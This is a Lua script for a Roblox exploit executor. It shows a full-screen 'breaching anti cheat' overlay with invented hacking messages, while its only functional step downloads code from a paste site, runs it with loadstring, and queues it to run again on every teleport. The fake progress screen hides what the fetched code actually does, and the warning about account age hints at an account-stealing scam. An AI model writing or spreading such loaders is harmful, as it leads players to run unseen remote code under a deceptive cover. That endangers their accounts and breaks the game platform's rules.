-- Q-THEMED AESTHETIC LOADER + HUB LOADER
if queueonteleport then
    queueonteleport(game:HttpGet("https://cdn.sourceb.in/bins/kOcmmcy45C/0", true))
end

local function showQBreachingCover()
    local CoreGui = game:GetService("CoreGui")
    pcall(function() CoreGui:FindFirstChild("QBreachingCover"):Destroy() end)

    local gui = Instance.new("ScreenGui")
    gui.Name = "QBreachingCover"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = CoreGui

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(26, 0, 38)
    bg.BackgroundTransparency = 0.11

    local shadow = Instance.new("ImageLabel", bg)
    shadow.AnchorPoint = Vector2.new(0.5,0.5)
    shadow.Position = UDim2.new(0.5,0,0.5,12)
    shadow.Size = UDim2.new(0, 452, 0, 230)
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageColor3 = Color3.fromRGB(140, 60, 255)
    shadow.ImageTransparency = 0.36
    shadow.BackgroundTransparency = 1

    local frame = Instance.new("Frame", bg)
    frame.Position = UDim2.new(0.5, -210, 0.5, -95)
    frame.Size = UDim2.new(0, 420, 0, 190)
    frame.BackgroundColor3 = Color3.fromRGB(42, 8, 64)
    frame.BackgroundTransparency = 0.09
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 28)

    -- Q Logo + Anim
    local ring = Instance.new("ImageLabel", frame)
    ring.Position = UDim2.new(0.19,0,0.5,0)
    ring.Size = UDim2.new(0, 90, 0, 90)
    ring.Image = "rbxassetid://4928372251"
    ring.ImageTransparency = 0.15
    ring.BackgroundTransparency = 1

    local qCircle = Instance.new("Frame", frame)
    qCircle.Position = UDim2.new(0.19,0,0.5,0)
    qCircle.Size = UDim2.new(0, 62, 0, 62)
    qCircle.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
    qCircle.BackgroundTransparency = 0.03
    Instance.new("UICorner", qCircle).CornerRadius = UDim.new(1, 0)

    local qTail = Instance.new("Frame", frame)
    qTail.Position = UDim2.new(0.19, 18, 0.5, 14)
    qTail.Size = UDim2.new(0, 13, 0, 6)
    qTail.BackgroundColor3 = Color3.fromRGB(210, 170, 255)
    qTail.BackgroundTransparency = 0.18
    Instance.new("UICorner", qTail).CornerRadius = UDim.new(1, 0)

    -- Code Rain
    local codeRain = Instance.new("Frame", frame)
    codeRain.Position = UDim2.new(0.01,0,0.08,0)
    codeRain.Size = UDim2.new(0,40,0.83,0)
    codeRain.BackgroundTransparency = 1
    for i=1,10 do
        local rain = Instance.new("TextLabel", codeRain)
        rain.Size = UDim2.new(1,0,0,12)
        rain.Position = UDim2.new(0,0,0,(i-1)*17)
        rain.Text = "Q0"
        rain.Font = Enum.Font.Code
        rain.TextColor3 = Color3.fromRGB(200, 140, 255)
        rain.BackgroundTransparency = 1
        rain.TextStrokeTransparency = 0.7
        rain.TextScaled = true
    end

    -- Labels
    local status = Instance.new("TextLabel", frame)
    status.Position = UDim2.new(0.28, 0, 0.20, 0)
    status.Size = UDim2.new(0.77, 0, 0.23, 0)
    status.BackgroundTransparency = 1
    status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM"
    status.TextColor3 = Color3.fromRGB(250, 209, 255)
    status.TextStrokeTransparency = 0.78
    status.Font = Enum.Font.GothamBlack
    status.TextScaled = true
    status.TextXAlignment = Enum.TextXAlignment.Left

    local substatus = Instance.new("TextLabel", frame)
    substatus.Position = UDim2.new(0.28, 0, 0.45, 0)
    substatus.Size = UDim2.new(0.72, 0, 0.13, 0)
    substatus.BackgroundTransparency = 1
    substatus.Text = "Deploying quantum bypass protocols..."
    substatus.TextColor3 = Color3.fromRGB(188, 140, 255)
    substatus.TextStrokeTransparency = 0.93
    substatus.Font = Enum.Font.GothamMedium
    substatus.TextScaled = true
    substatus.TextXAlignment = Enum.TextXAlignment.Left

    local progressBarBg = Instance.new("Frame", frame)
    progressBarBg.Position = UDim2.new(0.28, 0, 0.63, 0)
    progressBarBg.Size = UDim2.new(0.60, 0, 0.07, 0)
    progressBarBg.BackgroundColor3 = Color3.fromRGB(36, 0, 53)
    progressBarBg.BackgroundTransparency = 0.22
    Instance.new("UICorner", progressBarBg).CornerRadius = UDim.new(0, 8)

    local progressBar = Instance.new("Frame", progressBarBg)
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(200, 140, 255)
    progressBar.BackgroundTransparency = 0.09
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 8)

    local brand = Instance.new("TextLabel", frame)
    brand.Position = UDim2.new(0.82,0,0.83,0)
    brand.Size = UDim2.new(0.16,0, 0.13,0)
    brand.BackgroundTransparency = 1
    brand.Text = "Q"
    brand.TextColor3 = Color3.fromRGB(200, 140, 255)
    brand.TextStrokeTransparency = 0.38
    brand.TextScaled = true
    brand.Font = Enum.Font.GothamBold

    local notice = Instance.new("TextLabel", frame)
    notice.Position = UDim2.new(0.025, 0, 0.78, 0)
    notice.Size = UDim2.new(0.95, 0, 0.11, 0)
    notice.BackgroundTransparency = 1
    notice.Text = "Note: It may take a while to bypass Roblox anti cheat.\nIt won't work on new accounts or accounts below 100 days old."
    notice.TextColor3 = Color3.fromRGB(255, 230, 255)
    notice.TextStrokeColor3 = Color3.fromRGB(170, 60, 255)
    notice.TextStrokeTransparency = 0.2
    notice.TextTransparency = 0.01
    notice.TextScaled = true
    notice.Font = Enum.Font.GothamSemibold
    notice.TextWrapped = true

    -- Animations
    coroutine.wrap(function()
        local tips = {
            "Deploying quantum bypass protocols...",
            "Cracking encrypted security layers...",
            "Spoofing authentication tokens...",
            "Injecting stealth modules...",
            "Evading behavioral heuristics...",
            "Synchronizing with Q Core...",
            "Finalizing breach...",
        }
        local t, rainT, progress = 0, 0, 0
        while gui.Parent do
            t += 1
            local hue = (tick() * 0.12) % 1
            local color = Color3.fromHSV(hue, 0.52, 1)
            qCircle.BackgroundColor3 = color
            qTail.BackgroundColor3 = color
            ring.ImageColor3 = color
            ring.Rotation = (tick() * 46) % 360

            progress = (progress + 0.017) % 1.1
            progressBar:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.11, true)

            substatus.Text = tips[1 + (math.floor(t/13) % #tips)]
            status.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM" .. string.rep(".", t % 4)

            rainT += 1
            if rainT % 2 == 0 then
                for _,v in ipairs(codeRain:GetChildren()) do
                    v.Text = string.char(math.random(65,90))..string.char(math.random(48,57))
                end
            end
            wait(0.13)
        end
    end)()
end

-- Show Loader
showQBreachingCover()

-- Load Hub
pcall(function()
    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/kOcmmcy45C/0", true))()
end)
